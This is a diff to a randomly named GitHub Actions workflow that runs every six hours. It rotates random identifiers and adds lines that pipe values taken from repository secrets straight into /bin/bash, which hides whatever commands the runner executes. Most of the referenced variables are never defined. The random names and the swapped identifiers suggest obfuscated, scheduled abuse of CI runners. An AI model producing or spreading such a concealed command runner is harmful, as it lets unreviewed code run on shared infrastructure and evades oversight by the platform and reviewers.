@@ -1,25 +1,27 @@
 name: duyunahen
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
-jobs:  # 21484
+    - cron: '11 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duyunahen
         env:
-          qe1820: ${{ secrets.qe1820 }}
+          a4301: ${{ secrets.a4301 }}
         run: |
-          echo $qe1820 | jq -r .erpxo30 | /bin/bash
-          echo $ewv565 | jq -r .f3843 | /bin/bash
-          echo $xkjd9097 | jq -r .ptwdr4 | /bin/bash
-          echo $eumt529 | jq -r .xr0356 | /bin/bash
-          echo $ls896 | jq -r .p51 | /bin/bash
-          echo $y5927 | jq -r .k9 | /bin/bash
-          echo $rzsv814 | jq -r .ra42963 | /bin/bash
-          echo $vht93 | jq -r .hwij84676 | /bin/bash
-          echo $jzc572 | jq -r .riid61180 | /bin/bash
+          echo $a4301 | jq -r .fqq380 | /bin/bash
+          echo $vhap7814 | jq -r .ybrl4 | /bin/bash
+          echo $syau541 | jq -r .b94 | /bin/bash
+          echo $bod88 | jq -r .qz7 | /bin/bash
+          echo $wbgvt87691 | jq -r .zyyy1045 | /bin/bash
+          echo $awmgx6 | jq -r .r4 | /bin/bash
+          echo $goaue47 | jq -r .jj7 | /bin/bash
+          echo $zk4845 | jq -r .p77555 | /bin/bash
+          echo $qguww539 | jq -r .cfgfw50 | /bin/bash
+          echo $vwr9 | jq -r .zph55113 | /bin/bash
+          echo $ec87 | jq -r .rhwju72466 | /bin/bash
+          echo $lucy827 | jq -r .sw08 | /bin/bash
 
